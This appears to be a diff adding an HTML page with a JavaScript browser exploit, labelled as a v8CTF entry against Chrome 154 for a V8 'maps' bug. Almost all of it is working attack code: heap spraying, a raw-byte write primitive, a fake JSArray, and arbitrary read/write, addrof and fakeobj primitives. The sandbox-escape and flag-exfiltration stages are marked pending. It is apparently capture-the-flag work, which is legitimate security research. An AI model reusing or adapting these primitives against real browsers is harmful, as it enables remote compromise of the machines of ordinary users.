@@ -1,0 +1,147 @@
+<!doctype html>
+<html>
+<body>
+<script>
+// v8CTF chrome-154 exploit — maps-bug (crbug 559266114) -> in-cage R/W -> sandbox escape
+// Stage 1 is fully self-locating (no hardcoded heap addresses).
+function log(s){ console.log("DN " + s); }
+const buf = new ArrayBuffer(8); const f64 = new Float64Array(buf); const u32 = new Uint32Array(buf);
+function b2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
+function mkd(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
+const template = [mkd(0x2468, 0x3ff19999), mkd(0x2468, 0x3ff19999), mkd(0x2468, 0x3ff19999)];
+const marker = {};
+function mkDouble() { const a = template.slice(); a.tag = 0; return a; }
+function transition(a) { a[1] = marker; return a; }
+gl = mkDouble();
+function set(x) { gl = x; }
+for (let i = 0; i < 100; i++) set(mkDouble());
+const objElements = transition(mkDouble());
+const LOS_SPRAY_SIZE = 0x20000;
+const SPRAY = new Array(LOS_SPRAY_SIZE);
+for (let i = 0; i < LOS_SPRAY_SIZE; i++) SPRAY[i] = 7.777;
+const marker2 = {m: 7};
+const TAGS_SIZE = 0x40000;
+const TAGS = new Array(TAGS_SIZE);
+for (let i = 0; i < TAGS_SIZE; i++) TAGS[i] = 0x12345;
+TAGS[0] = marker2;
+
+// build-stable constants (verified 3/3 runs)
+const JSARR_DBL = 0x01033ddd;
+const EMPTY_FA = 0x7e5;
+
+// ---- maps-bug write: 8 raw bytes at odd addr = 2*n+3 ----
+function NewTarget() {}
+NewTarget.prototype = new Proxy({}, {});
+function makeFn(body, x, y) {
+  const fn = Reflect.construct(Function, [body], NewTarget);
+  fn.x = x;
+  if (y) fn.y = y;
+  return fn;
+}
+class Base { constructor(o) { return o; } }
+class DefineY extends Base { y = 1.1; }
+for (let i = 0; i < 15; i++) new DefineY({});
+function w8(addr, lo, hi) {
+  const smiX = (addr - 3) / 2;
+  const val = b2f(lo, hi);
+  let a = makeFn('"use strict"', smiX, 42);
+  let b = makeFn('"use strict"', smiX);
+  let c = makeFn('', 2.3, 2.3);
+  let d = new DefineY(makeFn('"use strict"', smiX));
+  let e = new DefineY(makeFn('"use strict"', smiX));
+  e.x = val;
+}
+function wb(addr, bytes) {
+  w8(addr, (bytes[0]|bytes[1]<<8|bytes[2]<<16|bytes[3]<<24)>>>0,
+           (bytes[4]|bytes[5]<<8|bytes[6]<<16|bytes[7]<<24)>>>0);
+}
+function le32(v) { return [v & 0xff, (v>>8)&0xff, (v>>16)&0xff, (v>>>24)&0xff]; }
+
+// ==== self-locate spray ====
+let sprayData = -1;
+const candidates = [];
+for (let c = 0x11c0000; c <= 0x1400000; c += 0x10000) candidates.push(c + 0x002001);
+for (let ci = 0; ci < candidates.length && sprayData < 0; ci++) {
+  const T = candidates[ci];
+  w8(T, 0x44332211, 0x88776655);
+  for (let k = 0; k < LOS_SPRAY_SIZE; k++) {
+    u32[0] = 0; u32[1] = 0; f64[0] = SPRAY[k];
+    if (u32[1] === 0x77665544) {
+      sprayData = (T >> 3) * 8 - 8 * k;
+      break;
+    }
+  }
+}
+if (sprayData < 0) { log("FATAL: spray not located"); throw "no spray"; }
+log("spray data @ 0x" + sprayData.toString(16));
+
+// ==== fake JSArray in spray ====
+const FAKE_OFF = 0x1000;
+const F = sprayData + 8 * FAKE_OFF;
+const fakeTagged = F + 1;
+function buildFake(elements, length) {
+  const m = le32(JSARR_DBL >>> 0), p = le32(EMPTY_FA >>> 0),
+        el = le32(elements >>> 0), ln = le32(length >>> 0);
+  wb(F - 3, [0xaa, 0xaa, 0xaa, m[0], m[1], m[2], m[3], p[0]]);
+  wb(F + 5, [p[1], p[2], p[3], el[0], el[1], el[2], el[3], ln[0]]);
+  wb(F + 13, [ln[1], ln[2], ln[3], 0xbb, 0xbb, 0xbb, 0xbb, 0xbb]);
+}
+buildFake((sprayData - 8) | 1, 0x2000000);
+
+// ==== locate TAGS + plant ====
+let fake = null;
+let tagsData = -1;
+const tagCands = [0x180000, 0x140000, 0x1c0000, 0x200000, 0x100000, 0x80000];
+for (let ci = 0; ci < tagCands.length && fake === null; ci++) {
+  const td = sprayData + tagCands[ci];
+  const slot = td + 8;
+  const ft = le32(fakeTagged >>> 0);
+  wb(slot - 3, [0x11, 0x22, 0x33, ft[0], ft[1], ft[2], ft[3], 0x8a]);
+  const v = TAGS[2];
+  if (typeof v === "object" && v !== null) { fake = v; tagsData = td; }
+}
+if (fake === null) { log("FATAL: TAGS not located"); throw "no tags"; }
+log("fakeobj OK; tagsData=0x" + tagsData.toString(16));
+
+// ==== primitives ====
+function areadBits(X) {
+  buildFake((X - 8) | 1, 0x2000000);
+  const v = fake[0]; u32[0] = 0; u32[1] = 0; f64[0] = v;
+  return [u32[0], u32[1]];
+}
+function aread32(X) { return areadBits(X)[0]; }
+function aread32h(X) { return areadBits(X)[1]; }
+function awrite(X, lo, hi) {
+  buildFake((X - 8) | 1, 0x2000000);
+  fake[0] = b2f(lo, hi);
+}
+function awrite32(X, v) {  // write low 32 bits, keep high 32 of existing mem
+  const h = areadBits(X)[1];
+  awrite(X, v >>> 0, h);
+}
+function addrof(o) {
+  TAGS[4] = o;
+  for (let ci = 0; ci < tagCands.length; ci++) {
+    const slot = tagsData + 16;
+    const ptr = aread32(slot);
+    if ((ptr & 1) === 1 && ptr > 0x10000 && ptr < 0x40000000) return ptr;
+  }
+  return -1;
+}
+function fakeobj(ptr) {
+  const slot = tagsData + 8;
+  const ft = le32(ptr >>> 0);
+  wb(slot - 3, [0x11, 0x22, 0x33, ft[0], ft[1], ft[2], ft[3], 0x8a]);
+  return TAGS[2];
+}
+log("stage1 ready");
+
+// ==== stage 2: sandbox escape (see NOTES_escape_*.md) ====
+// PENDING: wrapped-args (d7795fe6210) / EPT UAF (4d21392dd1a)
+
+// ==== stage 3: flag exfil ====
+// PENDING
+log("DONE");
+</script>
+</body>
+</html>
